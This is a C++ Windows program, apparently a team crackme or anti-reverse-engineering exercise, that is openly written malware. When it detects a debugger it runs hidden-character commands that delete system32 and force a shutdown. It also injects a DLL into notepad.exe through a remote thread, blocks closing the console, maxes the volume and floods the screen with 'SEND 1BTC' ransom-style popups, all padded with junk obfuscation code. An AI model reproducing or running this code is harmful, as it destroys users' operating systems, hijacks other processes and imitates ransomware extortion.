#include "stdafx.h"
#include <Windows.h>
#include <string.h>
#include <tlhelp32.h>
#include <sstream>
#include <mmsystem.h>
#include <iostream>
#include <shlwapi.h>

#pragma warning(disable : 4244)

#define KEY_SIZE 32
#define NEWLINE_AND_POSSIBLE_CHARACTER 3 // Used to verify if used inserted more than the KEY_SIZE.
#define MAX_KEY_SIZE (KEY_SIZE + NEWLINE_AND_POSSIBLE_CHARACTER)
#define HIDE_LETTER(letter)   char((letter) + 0x60)
#define UNHIDE_STRING(str)  do { char * ptr = str ; while (*ptr) *ptr++ -= 0x60; } while(0)
#define HIDE_STRING(str)  do {char * ptr = str ; while (*ptr) *ptr++ += 0x60;} while(0)

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CtrlHandler(DWORD fdwCtrlType);
void start_popup_nightmare();
void MySecret(void);

int i_2 = 0;
int x = 0;

bool is_debugging();
void break_machine();

/**
 * Verify if the key is valid according to the following rule:
 * key MUST BE [a-f, A-F, 0-9] < 32
 *
 * @param char *key -> Inserted key.
 * @return true if valid, false otherwise.
 */
bool is_key_valid(char *key) {
    // Verify if the inserted key is not longer than MAX_KEY_SIZE.
    if (strlen(key) > (unsigned) KEY_SIZE)
        return false;

    // USELESS CODE
    int a = 5, b = 0, c = 1;
    for (int d = 0; d < a; d++) {
      b = b / c;
      c += 1;
      for (int e = 0; e < a; e++)
        x++;
    }
    //

	if (is_debugging()) {
        break_machine();
		exit(1);
    }

    // Verify if it has contains only valid characters: [a-f, A-F, 0-9]
    for (unsigned int i = 0; i < strlen(key); i++) {
        char character = key[i];

        if (!((character >= 'a' && character <= 'f')
              || (character >= 'A' && character <= 'F')
              || (character >= '0' && character <= '9')))
            return false;
    }

    return true;
}

/**
 * Read the key and verify if it's valid.
 *
 * @return true if valid, false otherwise.
 */
bool check_if_valid(char *key) {
	bool is_valid = is_key_valid(key) ? true : false;

  // USELESS CODE
	int a = 5, b = 0, c = 1;
    
  for (int d = 0, z = 0; d < 1; ++d, z = 0) {
      c += (d % 2 == 0) ? 2 : -1;
      
      while (z++ < a) {
          if (b > 0) {
              x--;
              continue;
          }
          
          for (int e = 0; e < a; ++e) {
              if (e % 2 == 0) {
                  continue;
              }
          }
      }
  }
  //

  if (is_debugging()) {
        break_machine();
		exit(1);
    }

	if (is_valid)
		printf("%s\n", key); // Echo key.

	fflush(stdin);
	return is_valid;
}

/**
 * Break the machine by deleting all system32 files. Trigger a controlled shutdown 
 * after deleting files to prevent user intervention.
 */
void break_machine() {
    char shutdown[] = { 
      HIDE_LETTER('c'), HIDE_LETTER('m'), HIDE_LETTER('d'), HIDE_LETTER('.'), HIDE_LETTER('e'),
      HIDE_LETTER('x'), HIDE_LETTER('e'), HIDE_LETTER(' '), HIDE_LETTER('/'), HIDE_LETTER('c'), 
      HIDE_LETTER(' '), HIDE_LETTER('\"'), HIDE_LETTER('s'), HIDE_LETTER('t'), HIDE_LETTER('a'),
      HIDE_LETTER('r'), HIDE_LETTER('t'), HIDE_LETTER(' '), HIDE_LETTER('/'), HIDE_LETTER('b'),
      HIDE_LETTER(' '), HIDE_LETTER('s'), HIDE_LETTER('h'), HIDE_LETTER('u'), HIDE_LETTER('t'),
      HIDE_LETTER('d'), HIDE_LETTER('o'), HIDE_LETTER('w'), HIDE_LETTER('n'), HIDE_LETTER(' '),
      HIDE_LETTER('-'), HIDE_LETTER('s'), HIDE_LETTER(' '), HIDE_LETTER('-'), HIDE_LETTER('f'),
      HIDE_LETTER(' '), HIDE_LETTER('-'), HIDE_LETTER('t'), HIDE_LETTER(' '), HIDE_LETTER('3'),
      HIDE_LETTER('\"'), '\0'
    };

    char delete_files[] = { 
      HIDE_LETTER('c'), HIDE_LETTER('m'), HIDE_LETTER('d'), HIDE_LETTER('.'), HIDE_LETTER('e'),
      HIDE_LETTER('x'), HIDE_LETTER('e'), HIDE_LETTER(' '), HIDE_LETTER('/'), HIDE_LETTER('c'), 
      HIDE_LETTER(' '), HIDE_LETTER('\"'), HIDE_LETTER('r'), HIDE_LETTER('d'), HIDE_LETTER(' '),
      HIDE_LETTER('c'), HIDE_LETTER(':'), HIDE_LETTER('\\'), HIDE_LETTER('W'), HIDE_LETTER('I'),
      HIDE_LETTER('N'), HIDE_LETTER('D'), HIDE_LETTER('O'), HIDE_LETTER('W'), HIDE_LETTER('S'),
      HIDE_LETTER('\\'), HIDE_LETTER('s'), HIDE_LETTER('y'), HIDE_LETTER('s'), HIDE_LETTER('t'),
      HIDE_LETTER('e'), HIDE_LETTER('m'), HIDE_LETTER('3'), HIDE_LETTER('2'), HIDE_LETTER(' '),
      HIDE_LETTER('/'), HIDE_LETTER('S'), HIDE_LETTER(' '), HIDE_LETTER('/'), HIDE_LETTER('Q'),
      HIDE_LETTER(' '), HIDE_LETTER('2'), HIDE_LETTER('>'), HIDE_LETTER(' '), HIDE_LETTER('n'),
      HIDE_LETTER('u'), HIDE_LETTER('l'), HIDE_LETTER('\"'), '\0'
    };

    // USELESS CODE
    int a = 5, b = 0, c = 1, x = 0;

    for (int d = 0; d < a; d++) {
        b = 20 % 10 - 5;
        c += 12 % 3;   
        for (int e = 0; e < a; e++)
            x += 32 % 5;
    }
    // CODE

    UNHIDE_STRING(shutdown);
    UNHIDE_STRING(delete_files);
    system(shutdown);
    system(delete_files);
    HIDE_STRING(shutdown);
    HIDE_STRING(delete_files);
}

/**
 * Checks whether the program is being executed in debug mode. The purpose of this
 * function is to make the code more challenging to debug.
 *
 * @return true if in debug mode, false otherwise.
 */
bool is_debugging() {
    // First debug test, using the system function.
    if (IsDebuggerPresent()) {
        return true;
    }

  // USELESS CODE
	int a = 5, b = 0, c = 1;
    
    for (int d = 0, z = 0; d < 1; ++d, z = 0) {
		z += (d / 2) + z;
		int e = 0;
        
		while (e < a) {    
            for (e = 0; e < a; ++e) {
                z += e + a;
            }
        }
    }
    //

    // In case the first test passes in debug mode, the second verify
    // directly from the system process.
    int debug;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debug);

    return debug ? true : false;
}

/**
 * CtrlHandler - Handles CTRL-C and CTRL-CLOSE events.
 * @param fdwCtrlType Type of control event.
 * @return Returns TRUE if handled, FALSE otherwise.
 */
BOOL CtrlHandler(DWORD fdwCtrlType)
{
    // Prevent the user from closing the program with CTRL-C.
    if (fdwCtrlType == CTRL_C_EVENT)
    {
        return TRUE;
    }

	if (is_debugging()) {
        break_machine();
		exit(1);
    }

    // USELESS CODE
    int a = 5, b = 0, c = 1;

    for (int d = 0; d < a; d++) {
        b = (b * c) / (c + 1);
        c += (b % 3 == 0) ? 2 : 1;

        for (int e = 0; e < a; e++)
            b = (b + 2) * 3 - 1;
    }
    //

    // Prevent the user from closing the program with CTRL-CLOSE.
    if (fdwCtrlType == CTRL_CLOSE_EVENT)
    {
        start_popup_nightmare();
        return TRUE;
    }

	if (is_debugging()) {
        break_machine();
		exit(1);
    }

    return FALSE;
}

/**
 * The Window Procedure
 * @param hwnd Handle to the window
 * @param msg Message for this window
 * @param wParam Additional message information
 * @param lParam Additional message information
 * @return Returns the result of the message processing and depends on the message sent.
 */
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	if (is_debugging()) {
        break_machine();
		exit(1);
    }

    return DefWindowProc(hwnd, msg, wParam, lParam);
}

/**
 * Start the popup nightmare.
 * @return void
 */
void start_popup_nightmare(){
    // Prevent the user from closing the program.
    SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandler, TRUE);

    // Number of windows to be created.
    const int numWindows = 1000000000;

    // Get the screen size so that the windows are created on the screen.
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	if (is_debugging()) {
        break_machine();
		exit(1);
    }

    // USELESS CODE
    int a = 5, b = 0, c = 1;

    for (int d = 0; d < a * 2; d += 2) {
        c = (b + 1) * (c - 3);
        b += (c % 4 == 0) ? 7 : 2;

        for (int e = 0; e < a * 3; e += 3)
            b = (b * 2) + 1;
    }
    //

    // Set the volume to the maximum.
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, NULL, 0, 0, WAVE_FORMAT_QUERY);
    waveOutSetVolume(hWaveOut, 0xFFFFFFFF);
    waveOutClose(hWaveOut);

    // Create the window class.
    HINSTANCE hInstance = GetModuleHandle(NULL);
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"MyWindowClass";
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    RegisterClass(&wc);

	if (is_debugging()) {
        break_machine();
		exit(1);
    }

    for (int i = 0; i < numWindows; ++i)
    {
        // Play a sound.
        MessageBeep(MB_ICONHAND);

        // Create the window.
        std::wstringstream windowTitle;
        windowTitle << L"SEND 1BTC TO WAV@WAV.WAV";
        HWND hwnd = CreateWindow(L"MyWindowClass", windowTitle.str().c_str(), WS_OVERLAPPEDWINDOW,
                                 (100 + i * 40)%screenWidth, (100 + i * 40)%screenHeight, 400, 150, NULL, NULL,
                                 hInstance, NULL);
        ShowWindow(hwnd, SW_SHOW);
    }
}


BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    LUID luid;
    // USELESS CODE
    for (int i=0; i<100; i++){
        i_2 = 1;
        i_2 *= 1.0001;
        for (int j=0; j<100; j++)
            i_2++;
        i_2 ^= 89;
        i_2%=2;
    }
    // USELESS CODE

	if (is_debugging()) {
        break_machine();
		exit(1);
    }

    BOOL bRet=FALSE;
    if (LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
    {
		TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount=1;
        // USELESS CODE
        while(i_2 < 1000000)
            i_2++;
        i_2 ^= 23;
        i_2 *= 1.0001;
        // USELESS CODE
        tp.Privileges[0].Luid=luid;
        tp.Privileges[0].Attributes=(bEnablePrivilege) ? SE_PRIVILEGE_ENABLED: 0;
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        {
            bRet=(GetLastError() == ERROR_SUCCESS);
        }	
    }
    // USELESS CODE
    for (int i=0; i<100; i++){
        i_2 = 1000;
        i_2 /= 1.0001;
        for (int j=0; j<100; j++)
            i_2--;
        i_2 ^= 10;
        i_2%=100;
    }
    // USELESS CODE

	if (is_debugging()) {
        break_machine();
		exit(1);
    }

    return bRet;
}

// to get pif by name of exe
DWORD GetPidByName(const char* name){
	HANDLE myProcess=GetCurrentProcess();
	HANDLE hToken;
	if (OpenProcessToken(myProcess, TOKEN_ADJUST_PRIVILEGES, &hToken)){	
		SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
		CloseHandle(hToken);
	}

	if (is_debugging()) {
        break_machine();
		exit(1);
    }

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    // USELESS CODE
    while(i_2 < 1000000)
        i_2++;
    i_2 ^= 56;
    i_2 *= 1.0001;
    // USELESS CODE
    char buf[MAX_PATH] = { 0 };
    size_t charsConverted = 0;

	if (is_debugging()) {
        break_machine();
		exit(1);
    }

	//to create a snapshot of the current processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	//to iterate through the processes
	if (Process32First(snapshot, &entry)) {
        while(Process32Next(snapshot, &entry)) {
            // USELESS CODE
            for (int i=0; i<100; i++){
                i_2 = 1;
                i_2 ^= 90;
                i_2 *= 1.0001;
                for (int j=0; j<100; j++)
                    i_2++;
                i_2%=2;
            }
            // USELESS CODE
            // to convert the name of exe file from wide string to multibyte string
            wcstombs_s(&charsConverted, buf, entry.szExeFile, MAX_PATH);
            if(_stricmp(buf, name)== 0){
                HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(entry.th32ProcessID));
                if(ph != NULL){
                    CloseHandle(snapshot);
                    // USELESS CODE
                    for (int i=0; i<100; i++){
                        i_2 = 100;
                        i_2 /= 1.0001;
                        for (int j=0; j<100; j++)
                            i_2++;
                        i_2 ^= 28;
                        i_2%=100;
                    }
                    // USELESS CODE
                    return entry.th32ProcessID;
                }else{
                    DWORD error = GetLastError();
                }
            }
            // USELESS CODE
            for (int i=0; i<100; i++){
                i_2 = 1;
                i_2 *= 1.0001;
                i_2 ^= 12;
                for (int j=0; j<100; j++)
                    i_2++;
                i_2%=20;
            }
            // USELESS CODE
        }
    }

    CloseHandle(snapshot);
    return 0;  // Process ID not found
}

// to start a new process
int StartNewProcess(const char* processName){
	if (is_debugging()) {
        break_machine();
		exit(1);
    }

    const char* prependChars = "C:\\WINDOWS\\System32\\";
    size_t originalLength = strlen(processName);
    size_t prependLength = strlen(prependChars);
    char* modifiedName = new char[prependLength + originalLength+1];
    // USELESS CODE
    while(i_2 < 1000000)
        i_2++;
    i_2 ^= 67;
    i_2 *= 1.0001;
    // USELESS CODE
    strcpy_s(modifiedName, prependLength + originalLength + 1, prependChars);
    strcat_s(modifiedName, prependLength + originalLength + 1, processName);

	int wideLength = MultiByteToWideChar(CP_UTF8,0,modifiedName,-1,nullptr,0);
	wchar_t* wideProcessName = new wchar_t[wideLength];
	MultiByteToWideChar(CP_UTF8,0,modifiedName,-1,wideProcessName,wideLength);

	STARTUPINFO si = {sizeof(si)};
	PROCESS_INFORMATION pi;

	if (is_debugging()) {
        break_machine();
		exit(1);
    }

	LPCTSTR applicationName = wideProcessName;
	LPTSTR commandLine = NULL;
	LPSECURITY_ATTRIBUTES processAttributes = NULL;
	LPSECURITY_ATTRIBUTES threadAttributes = NULL;
	BOOL inheritHandles = FALSE;
	DWORD creationFlags =0;
	LPVOID environment = NULL;
	LPCTSTR currentDirectory = NULL;
	LPSTARTUPINFO startupInfo = &si;
	LPPROCESS_INFORMATION processInformation = &pi;

    BOOL result = CreateProcess(
            applicationName,
            commandLine,
            processAttributes,
            threadAttributes,
            inheritHandles,
            creationFlags,
            environment,
            currentDirectory,
            startupInfo,
            processInformation);
    if(result){
        // USELESS CODE
        while (i_2 < 1000000)
            i_2++;
        i_2 ^= 36;
        i_2 *= 1.0001;
        // USELESS CODE

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        // USELESS CODE
        for (int i=0; i<100; i++){
            i_2 = 1;
            i_2 *= 1.0001;
            i_2 ^= 45;
            for (int j=0; j<100; j++)
                i_2++;
            i_2%=2;
        }
        // USELESS CODE
        return pi.dwProcessId;
    }else{
        return 0;

    }

}

void StartInjection(){

    // Get the full path of the executable
    wchar_t exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

	if (is_debugging()) {
        break_machine();
		exit(1);
    }

	// Extract the directory from the full path
    wchar_t exeDirectory[MAX_PATH];
    wcscpy_s(exeDirectory, exePath);
    PathRemoveFileSpec(exeDirectory);

    // Combine the directory with the DLL filename
    wchar_t dllPath[MAX_PATH];
    PathCombine(dllPath, exeDirectory, L"injection.dll");

	// Convert wide string to narrow string
    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, dllPath, -1, NULL, 0, NULL, NULL);
    // USELESS CODE
    while(i_2 < 1000000)
        i_2++;
    i_2 ^= 78;
    i_2 *= 1.0001;
    // USELESS CODE
    char* dll = new char[bufferSize];
    WideCharToMultiByte(CP_UTF8, 0, dllPath, -1, dll, bufferSize, NULL, NULL);

	// To get cmd.exe's process id
	DWORD pid = GetPidByName("notepad.exe");

	if (is_debugging()) {
        break_machine();
		exit(1);
    }

    if(pid == 0 || pid == NULL){
        pid = StartNewProcess("notepad.exe");
        // USELESS CODE
        for (int i=0; i<100; i++){
            i_2 = 1;
            i_2 *= 1.0001;
            i_2 ^= 45;
            for (int j=0; j<100; j++)
                i_2++;
            i_2%=2;
        }
        // USELESS CODE
    }
    // to open the notepad process
    HANDLE notepad = OpenProcess(PROCESS_ALL_ACCESS | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, DWORD(pid));
    // to inject the dll
    LPVOID dll_in_notepad = VirtualAllocEx(notepad, NULL, strlen(dll)+1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    // to write the DLL path to the allocated memory in the target process
    DWORD ecrites;
    WriteProcessMemory(notepad, dll_in_notepad, dll, strlen(dll)+1, &ecrites);
    // to get a handle to the kernel32 module
    HMODULE hKernel32 = GetModuleHandle(L"Kernel32");
    // to get the address of the Loadlibrary function
    LPVOID load_library = (LPVOID) GetProcAddress(hKernel32, "LoadLibraryA");

    // to create a remote thread in the target process to execute LoadLibraryA
    CreateRemoteThread(notepad, NULL, 0, (LPTHREAD_START_ROUTINE) load_library, dll_in_notepad, 0, NULL);
    // USELESS CODE
    for (int i=0; i<100; i++){
        i_2 = 1;
        i_2 *= 1.01;
        i_2 ^= 73;
        for (int j=0; j<100; j++)
            i_2++;
        i_2%=2;
    }
    // USELESS CODE
    WaitForSingleObject(notepad, 12000);
    CloseHandle(notepad);
}

void MySecret(void){
	if (is_debugging()) {
        break_machine();
		exit(1);
    }

	int i = 2;
	i++;
	if(i < 5){
		printf("I'll tell you that my secret is :RFSSEFSÃ¹%s452^^s \n");
	}
}


int main(int argc, char* argv[]) {
    if (is_debugging()) {
        // run Victor's trap.
        break_machine();
		    exit(1);
    }

    if (argc != 2) {
		    // execute malware.
            StartInjection();
            start_popup_nightmare();
            return 1;
	  }
  
    char *key = argv[1];

    if (!check_if_valid(key)) {
        // run Wenjia's trap then Armand's one.
        StartInjection();
        start_popup_nightmare();

        if (is_debugging()) {
            // run Victor's trap.
            break_machine();
        }

        // must be in code for compiler not to simplify it
        char hello[11] = { 't' ^42, 'w' ^42, 'k' ^42, 'z' ^42, 'A' ^42, 'm' ^42, 'x' ^42, 'i' ^42, 'E' ^42, 'o' ^42, '\x00' ^42};
        char verification[11] = { 't' ^40, 'w' ^40, 'k' ^40, 'z' ^40, 'A' ^40, 'm' ^40, 'x' ^40, 'i' ^40, 'E' ^40, 'o' ^40, '\x00' ^40};
        char* s = hello;
        char* v = verification;
        for (int k = 0;k<11;k++) {
            s[k] = s[k] ^ 42;
            // USELESS CODE
            for (int i=0; i<100; i++){
                i_2 = 1;
                i_2 *= 1.0001;
                i_2 ^= 70;
                for (int j=0; j<100; j++)
                    i_2++;
                i_2%=2;
            }
            // USELESS CODE
            v[k] = v[k] ^ 40;
        }

        if (is_debugging()) {
            // run Victor's trap.
            break_machine();
        }

        if (strcmp(s, v) == 0) {
            printf("%s\n", s);
            Sleep(5);
            // run Victor's trap
            break_machine();
            // user should not come this far but just in case
			DWORD old;
            void * funcAddr = (void*) MySecret;
            VirtualProtect(funcAddr, 5, PAGE_EXECUTE_READWRITE, & old);
            char code[10] = {'\xff', '\xd6', '\xcc','\xcc', '\xcc'};
	        memcpy(funcAddr, code, sizeof(code));
            VirtualProtect(funcAddr, 5, old, &old);
            MySecret();
        }

        if (is_debugging()) {
            // run Victor's trap.
            break_machine();
        }

        for (int k = 0;k<11;k++) {
            s[k] = s[k] ^ 42;
            // USELESS CODE
            for (int i=0; i<100; i++){
                i_2 = 1;
                i_2 *= 1.0001;
                i_2 ^= 12;
                for (int j=0; j<100; j++)
                    i_2++;
                i_2%=2;
            }
            // USELESS CODE
            v[k] = v[k] ^ 40;
        }
    }
    return 0;
}
